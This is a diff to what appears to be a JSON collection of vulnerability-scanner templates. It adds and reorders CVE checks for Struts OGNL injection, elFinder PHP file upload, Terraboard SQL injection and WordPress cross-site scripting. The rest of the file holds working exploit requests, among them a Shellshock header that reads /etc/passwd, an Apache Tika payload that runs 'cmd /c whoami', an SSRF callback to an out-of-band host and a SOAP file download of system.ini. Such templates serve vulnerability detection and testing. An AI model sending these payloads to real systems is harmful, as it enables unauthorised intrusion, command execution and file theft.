@@ -2504,6 +2504,21 @@
       ]
     },
     {
+      "id": "CVE-2012-0394",
+      "info": {
+        "name": "Apache Struts Dev Mode OGNL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{first}}*{{second}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-0896",
       "info": {
         "name": "Count Per Day <= 3.1 - download.php f Parameter Traversal Arbitrary File Access",
@@ -3406,9 +3421,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6786,11 +6801,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10364,8 +10379,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -12382,9 +12397,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -18619,6 +18634,22 @@
       ]
     },
     {
+      "id": "CVE-2021-43421",
+      "info": {
+        "name": "Studio-42 elFinder < 2.1.60 - Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{randstr}}.php:aaa HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content={{randstr_1}} HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /elfinder/files/{{randstr}}.php%3Aaaa?_t= HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-43495",
       "info": {
         "name": "AlquistManager Local File Inclusion",
@@ -18756,7 +18787,7 @@
       ]
     },
     {
-      "id": "unauth-rlm",
+      "id": "CVE-2021-44152",
       "info": {
         "name": "Reprise License Manager 14.2 - Authentication Bypass",
         "severity": "critical"
@@ -20354,6 +20385,20 @@
       ]
     },
     {
+      "id": "CVE-2022-1883",
+      "info": {
+        "name": "Terraboard < 2.2.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /api/search/attribute?versionid=*&tf_version=%27+and+(select%20pg_sleep(10))+ISNULL-- HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1904",
       "info": {
         "name": "WordPress Easy Pricing Tables <3.2.1 - Cross-Site Scripting",
@@ -20393,6 +20438,36 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1916",
+      "info": {
+        "name": "Active Products Tables for WooCommerce < 1.0.5 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\\u003cscript%3Ealert(document.domain)\\u003c/script%3E%22}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1933",
+      "info": {
+        "name": "CDI < 5.1.9 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E"
           ]
         }
       ]
